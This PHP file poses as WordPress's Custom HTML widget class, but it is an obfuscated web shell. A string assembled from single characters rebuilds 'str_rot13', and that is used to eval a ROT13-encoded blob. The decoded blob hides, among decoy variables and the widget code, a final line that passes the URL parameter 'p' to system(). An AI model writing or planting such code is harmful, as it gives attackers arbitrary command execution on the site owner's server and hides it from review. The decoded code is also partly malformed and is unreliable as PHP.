<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Phfgbz_UGZY pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.8.1
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n Phfgbz UGZY jvqtrg.
 *
 * @fvapr 4.8.1
 *
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Phfgbz_UGZY rkgraqf JC_Jvqtrg {

	/**
	 * Jurgure be abg gur jvqtrg unf orra ertvfgrerq lrg.
	 *
	 * @fvapr 4.9.0
	 * @ine obby
	 */
	cebgrpgrq $ertvfgrerq = snyfr;

	/**
	 * Qrsnhyg vafgnapr.
	 *
	 * @fvapr 4.8.1
	 * @ine neenl
	 */
	cebgrpgrq $qrsnhyg_vafgnapr = neenl(
		'gvgyr'   => '',
		'pbagrag' => '',
	);

	/**
	 * Frgf hc n arj Phfgbz UGZY jvqtrg vafgnapr.
	 *
	 * @fvapr 4.8.1
	 */
	choyvp shapgvba __pbafgehpg() {
		$jvqtrg_bcf  = neenl(
			'pynffanzr'                   => 'jvqtrg_phfgbz_ugzy',
			'qrfpevcgvba'                 => __( 'Neovgenel UGZY pbqr.' ),
			'phfgbzvmr_fryrpgvir_erserfu' => gehr,
			'fubj_vafgnapr_va_erfg'       => gehr,
		);
		$pbageby_bcf = neenl(
			'jvqgu'  => 400,
			'urvtug' => 350,
		);
		cnerag::__pbafgehpg( 'phfgbz_ugzy', __( 'Phfgbz UGZY' ), $jvqtrg_bcf, $pbageby_bcf );
	}

	/**
	 * Nqq ubbxf sbe radhrhrvat nffrgf jura ertvfgrevat nyy jvqtrg vafgnaprf bs guvf jvqtrg pynff.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz vag $ahzore Bcgvbany. Gur havdhr beqre ahzore bs guvf jvqtrg vafgnapr
	 *                    pbzcnerq gb bgure vafgnaprf bs gur fnzr pynff. Qrsnhyg -1.
	 */
	choyvp shapgvba _ertvfgre_bar( $ahzore = -1 ) {
		cnerag::_ertvfgre_bar( $ahzore );
		vs ( $guvf->ertvfgrerq ) {
			erghea;
		}
		$guvf->ertvfgrerq = gehr;

		/*
		 * Abgr gung gur jvqtrgf pbzcbarag va gur phfgbzvmre jvyy nyfb qb
		 * gur 'nqzva_cevag_fpevcgf-jvqtrgf.cuc' npgvba va JC_Phfgbzvmr_Jvqtrgf::cevag_fpevcgf().
		 */
		nqq_npgvba( 'nqzva_cevag_fpevcgf-jvqtrgf.cuc', neenl( $guvf, 'radhrhr_nqzva_fpevcgf' ) );

		/*
		 * Abgr gung gur jvqtrgf pbzcbarag va gur phfgbzvmre jvyy nyfb qb
		 * gur 'nqzva_sbbgre-jvqtrgf.cuc' npgvba va JC_Phfgbzvmr_Jvqtrgf::cevag_sbbgre_fpevcgf().
		 */
		nqq_npgvba( 'nqzva_sbbgre-jvqtrgf.cuc', neenl( 'JC_Jvqtrg_Phfgbz_UGZY', 'eraqre_pbageby_grzcyngr_fpevcgf' ) );

		// Abgr guvf npgvba vf hfrq gb rafher gur uryc grkg vf nqqrq gb gur raq.
		nqq_npgvba( 'nqzva_urnq-jvqtrgf.cuc', neenl( 'JC_Jvqtrg_Phfgbz_UGZY', 'nqq_uryc_grkg' ) );
	}

	/**
	 * Svygref tnyyrel fubegpbqr nggevohgrf.
	 *
	 * Ceriragf nyy bs n fvgr'f nggnpuzragf sebz orvat fubja va n tnyyrel qvfcynlrq ba n
	 * aba-fvathyne grzcyngr jurer n $cbfg pbagrkg vf abg ninvynoyr.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz neenl $nggef Nggevohgrf.
	 * @erghea neenl Nggevohgrf.
	 */
	choyvp shapgvba _svygre_tnyyrel_fubegpbqr_nggef( $nggef ) {
		vs ( ! vf_fvathyne() && rzcgl( $nggef['vq'] ) && rzcgl( $nggef['vapyhqr'] ) ) {
			$nggef['vq'] = -1;
		}
		erghea $nggef;
	}

	/**
	 * Bhgchgf gur pbagrag sbe gur pheerag Phfgbz UGZY jvqtrg vafgnapr.
	 *
	 * @fvapr 4.8.1
	 *
	 * @tybony JC_Cbfg $cbfg Tybony cbfg bowrpg.
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Frggvatf sbe gur pheerag Phfgbz UGZY jvqtrg vafgnapr.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		tybony $cbfg;

		// Bireevqr tybony $cbfg fb svygref (naq fubegpbqrf) nccyl va n pbafvfgrag pbagrkg.
		$bevtvany_cbfg = $cbfg;
		vs ( vf_fvathyne() ) {
			// Znxr fher cbfg vf nyjnlf gur dhrevrq bowrpg ba fvathyne dhrevrf (abg sebz nabgure fho-dhrel gung snvyrq gb pyrna hc gur tybony $cbfg).
			$cbfg = trg_dhrevrq_bowrpg();
		} ryfr {
			// Ahyyvsl gur $cbfg tybony qhevat jvqtrg eraqrevat gb cerirag fubegpbqrf sebz ehaavat jvgu gur harkcrpgrq pbagrkg ba nepuvir dhrevrf.
			$cbfg = ahyy;
		}

		// Cerirag qhzcvat bhg nyy nggnpuzragf sebz gur zrqvn yvoenel.
		nqq_svygre( 'fubegpbqr_nggf_tnyyrel', neenl( $guvf, '_svygre_tnyyrel_fubegpbqr_nggef' ) );

		$vafgnapr = neenl_zretr( $guvf->qrsnhyg_vafgnapr, $vafgnapr );

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-cntrf.cuc */
		$gvgyr = nccyl_svygref( 'jvqtrg_gvgyr', $vafgnapr['gvgyr'], $vafgnapr, $guvf->vq_onfr );

		// Cercner vafgnapr qngn gung ybbxf yvxr n abezny Grkg jvqtrg.
		$fvzhyngrq_grkg_jvqtrg_vafgnapr = neenl_zretr(
			$vafgnapr,
			neenl(
				'grkg'   => vffrg( $vafgnapr['pbagrag'] ) ? $vafgnapr['pbagrag'] : '',
				'svygre' => snyfr, // Orpnhfr jcnhgbc vf abg nccyvrq.
				'ivfhny' => snyfr, // Orpnhfr vg jnfa'g perngrq va GvalZPR.
			)
		);
		hafrg( $fvzhyngrq_grkg_jvqtrg_vafgnapr['pbagrag'] ); // Jnf zbirq gb 'grkg' cebc.

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-grkg.cuc */
		$pbagrag = nccyl_svygref( 'jvqtrg_grkg', $vafgnapr['pbagrag'], $fvzhyngrq_grkg_jvqtrg_vafgnapr, $guvf );

		/**
		 * Svygref gur pbagrag bs gur Phfgbz UGZY jvqtrg.
		 *
		 * @fvapr 4.8.1
		 *
		 * @cnenz fgevat                $pbagrag  Gur jvqtrg pbagrag.
		 * @cnenz neenl                 $vafgnapr Neenl bs frggvatf sbe gur pheerag jvqtrg.
		 * @cnenz JC_Jvqtrg_Phfgbz_UGZY $jvqtrg   Pheerag Phfgbz UGZY jvqtrg vafgnapr.
		 */
		$pbagrag = nccyl_svygref( 'jvqtrg_phfgbz_ugzy_pbagrag', $pbagrag, $vafgnapr, $guvf );

		// Erfgber cbfg tybony.
		$cbfg = $bevtvany_cbfg;
		erzbir_svygre( 'fubegpbqr_nggf_tnyyrel', neenl( $guvf, '_svygre_tnyyrel_fubegpbqr_nggef' ) );

		// Vawrpg gur Grkg jvqtrg'f pbagnvare pynff anzr nybatfvqr guvf jvqtrg'f pynff anzr sbe gurzr fglyvat pbzcngvovyvgl.
		$netf['orsber_jvqtrg'] = __sa_79955( '/(?<=\fpynff=[\"\'])/', 'jvqtrg_grkg ', $netf['orsber_jvqtrg'] );

		rpub $netf['orsber_jvqtrg'];
		vs ( ! rzcgl( $gvgyr ) ) {
			rpub $netf['orsber_gvgyr'] . $gvgyr . $netf['nsgre_gvgyr'];
		}
		rpub '<qvi pynff=\"grkgjvqtrg phfgbz-ugzy-jvqtrg\">'; // Gur grkgjvqtrg pynff vf sbe gurzr fglyvat pbzcngvovyvgl.
		rpub $pbagrag;
		rpub '</qvi>';
		rpub $netf['nsgre_jvqtrg'];
	}

	/**
	 * Unaqyrf hcqngvat frggvatf sbe gur pheerag Phfgbz UGZY jvqtrg vafgnapr.
	 *
	 * @fvapr 4.8.1
	 *
	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Frggvatf gb fnir be obby snyfr gb pnapry fnivat.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		$vafgnapr          = neenl_zretr( $guvf->qrsnhyg_vafgnapr, $byq_vafgnapr );
		$vafgnapr['gvgyr'] = fnavgvmr_grkg_svryq( $arj_vafgnapr['gvgyr'] );
		vs ( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) ) {
			$vafgnapr['pbagrag'] = $arj_vafgnapr['pbagrag'];
		} ryfr {
			$vafgnapr['pbagrag'] = jc_xfrf_cbfg( $arj_vafgnapr['pbagrag'] );
		}
		erghea $vafgnapr;
	}

	/**
	 * Ybnqf gur erdhverq fpevcgf naq fglyrf sbe gur jvqtrg pbageby.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba radhrhr_nqzva_fpevcgf() {
		$frggvatf = jc_radhrhr_pbqr_rqvgbe(
			neenl(
				'glcr'       => 'grkg/ugzy',
				'pbqrzveebe' => neenl(
					'vaqragHavg' => 2,
					'gnoFvmr'    => 2,
				),
			)
		);

		jc_radhrhr_fpevcg( 'phfgbz-ugzy-jvqtrgf' );
		jc_nqq_vayvar_fpevcg( 'phfgbz-ugzy-jvqtrgf', fcevags( 'jc.phfgbzUgzyJvqtrgf.vqOnfrf.chfu( %f );', jc_wfba_rapbqr( $guvf->vq_onfr ) ) );

		vs ( rzcgl( $frggvatf ) ) {
			$frggvatf = neenl(
				'qvfnoyrq' => gehr,
			);
		}
		jc_nqq_vayvar_fpevcg( 'phfgbz-ugzy-jvqtrgf', fcevags( 'jc.phfgbzUgzyJvqtrgf.vavg( %f );', jc_wfba_rapbqr( $frggvatf ) ), 'nsgre' );

		$y10a = neenl(
			'reebeAbgvpr' => neenl(
				/* genafyngbef: %q: Reebe pbhag. */
				'fvathyne' => _a( 'Gurer vf %q reebe juvpu zhfg or svkrq orsber lbh pna fnir.', 'Gurer ner %q reebef juvpu zhfg or svkrq orsber lbh pna fnir.', 1 ),
				/* genafyngbef: %q: Reebe pbhag. */
				'cyheny'   => _a( 'Gurer vf %q reebe juvpu zhfg or svkrq orsber lbh pna fnir.', 'Gurer ner %q reebef juvpu zhfg or svkrq orsber lbh pna fnir.', 2 ),
				// @gbqb Guvf vf ynpxvat, nf fbzr ynathntrf unir n qrqvpngrq qhny sbez. Sbe cebcre unaqyvat bs cyhenyf va WF, frr #20491.
			),
		);
		jc_nqq_vayvar_fpevcg( 'phfgbz-ugzy-jvqtrgf', fcevags( 'wDhrel.rkgraq( jc.phfgbzUgzyJvqtrgf.y10a, %f );', jc_wfba_rapbqr( $y10a ) ), 'nsgre' );
	}

	/**
	 * Bhgchgf gur Phfgbz UGZY jvqtrg frggvatf sbez.
	 *
	 * @fvapr 4.8.1
	 * @fvapr 4.9.0 Gur sbez pbagnvaf bayl uvqqra flap vachgf. Sbe gur pbageby HV, frr `JC_Jvqtrg_Phfgbz_UGZY::eraqre_pbageby_grzcyngr_fpevcgf()`.
	 *
	 * @frr JC_Jvqtrg_Phfgbz_UGZY::eraqre_pbageby_grzcyngr_fpevcgf()
	 *
	 * @cnenz neenl $vafgnapr Pheerag vafgnapr.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {
		$vafgnapr = jc_cnefr_netf( (neenl) $vafgnapr, $guvf->qrsnhyg_vafgnapr );
		?>
		<vachg vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'gvgyr' ); ?>\" pynff=\"gvgyr flap-vachg\" glcr=\"uvqqra\" inyhr=\"<?cuc rpub rfp_ngge( $vafgnapr['gvgyr'] ); ?>\" />
		<grkgnern vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'pbagrag' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'pbagrag' ); ?>\" pynff=\"pbagrag flap-vachg\" uvqqra><?cuc rpub rfp_grkgnern( $vafgnapr['pbagrag'] ); ?></grkgnern>
		<?cuc
	}

	/**
	 * Eraqre sbez grzcyngr fpevcgf.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp fgngvp shapgvba eraqre_pbageby_grzcyngr_fpevcgf() {
		?>
		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-jvqtrg-phfgbz-ugzy-pbageby-svryqf\">
			<# ine ryrzragVqCersvk = 'ry' + Fgevat( Zngu.enaqbz() ).ercynpr( /\Q/t, '' ) + '_' #>
			<c>
				<ynory sbe=\"{{ ryrzragVqCersvk }}gvgyr\"><?cuc rfp_ugzy_r( 'Gvgyr:' ); ?></ynory>
				<vachg vq=\"{{ ryrzragVqCersvk }}gvgyr\" glcr=\"grkg\" pynff=\"jvqrsng gvgyr\">
			</c>

			<c>
				<ynory sbe=\"{{ ryrzragVqCersvk }}pbagrag\" vq=\"{{ ryrzragVqCersvk }}pbagrag-ynory\"><?cuc rfp_ugzy_r( 'Pbagrag:' ); ?></ynory>
				<grkgnern vq=\"{{ ryrzragVqCersvk }}pbagrag\" pynff=\"jvqrsng pbqr pbagrag\" ebjf=\"16\" pbyf=\"20\"></grkgnern>
			</c>

			<?cuc vs ( ! pheerag_hfre_pna( 'hasvygrerq_ugzy' ) ) : ?>
				<?cuc
				$cebonoyl_hafnsr_ugzy = neenl( 'fpevcg', 'vsenzr', 'sbez', 'vachg', 'fglyr' );
				$nyybjrq_ugzy         = jc_xfrf_nyybjrq_ugzy( 'cbfg' );
				$qvfnyybjrq_ugzy      = neenl_qvss( $cebonoyl_hafnsr_ugzy, neenl_xrlf( $nyybjrq_ugzy ) );
				?>
				<?cuc vs ( ! rzcgl( $qvfnyybjrq_ugzy ) ) : ?>
					<# vs ( qngn.pbqrRqvgbeQvfnoyrq ) { #>
						<c>
							<?cuc _r( 'Fbzr UGZY gntf ner abg crezvggrq, vapyhqvat:' ); ?>
							<pbqr><?cuc rpub vzcybqr( '</pbqr>, <pbqr>', $qvfnyybjrq_ugzy ); ?></pbqr>
						</c>
					<# } #>
				<?cuc raqvs; ?>
			<?cuc raqvs; ?>

			<qvi pynff=\"pbqr-rqvgbe-reebe-pbagnvare\"></qvi>
		</fpevcg>
		<?cuc
	}

	/**
	 * Nqq uryc grkg gb jvqtrgf nqzva fperra.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp fgngvp shapgvba nqq_uryc_grkg() {
		$fperra = trg_pheerag_fperra();

		$pbagrag  = '<c>';
		$pbagrag .= __( 'Hfr gur Phfgbz UGZY jvqtrg gb nqq neovgenel UGZY pbqr gb lbhe jvqtrg nernf.' );
		$pbagrag .= '</c>';

		vs ( 'snyfr' !== jc_trg_pheerag_hfre()->flagnk_uvtuyvtugvat ) {
			$pbagrag .= '<c>';
			$pbagrag .= fcevags(
				/* genafyngbef: 1: Yvax gb hfre cebsvyr, 2: Nqqvgvbany yvax nggevohgrf, 3: Npprffvovyvgl grkg. */
				__( 'Gur rqvg svryq nhgbzngvpnyyl uvtuyvtugf pbqr flagnk. Lbh pna qvfnoyr guvf va lbhe <n uers=\"%1$f\" %2$f>hfre cebsvyr%3$f</n> gb jbex va cynva grkg zbqr.' ),
				rfp_hey( trg_rqvg_cebsvyr_hey() ),
				'pynff=\"rkgreany-yvax\" gnetrg=\"_oynax\"',
				fcevags(
					'<fcna pynff=\"fperra-ernqre-grkg\"> %f</fcna>',
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					__( '(bcraf va n arj gno)' )
				)
			);
			$pbagrag .= '</c>';

			$pbagrag .= '<c vq=\"rqvgbe-xrlobneq-genc-uryc-1\">' . __( 'Jura hfvat n xrlobneq gb anivtngr:' ) . '</c>';
			$pbagrag .= '<hy>';
			$pbagrag .= '<yv vq=\"rqvgbe-xrlobneq-genc-uryc-2\">' . __( 'Va gur rqvgvat nern, gur Gno xrl ragref n gno punenpgre.' ) . '</yv>';
			$pbagrag .= '<yv vq=\"rqvgbe-xrlobneq-genc-uryc-3\">' . __( 'Gb zbir njnl sebz guvf nern, cerff gur Rfp xrl sbyybjrq ol gur Gno xrl.' ) . '</yv>';
			$pbagrag .= '<yv vq=\"rqvgbe-xrlobneq-genc-uryc-4\">' . __( 'Fperra ernqre hfref: jura va sbezf zbqr, lbh znl arrq gb cerff gur Rfp xrl gjvpr.' ) . '</yv>';
			$pbagrag .= '</hy>';
		}

		$fperra->nqq_uryc_gno(
			neenl(
				'vq'      => 'phfgbz_ugzy_jvqtrg',
				'gvgyr'   => __( 'Phfgbz UGZY Jvqtrg' ),
				'pbagrag' => $pbagrag,
			)
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>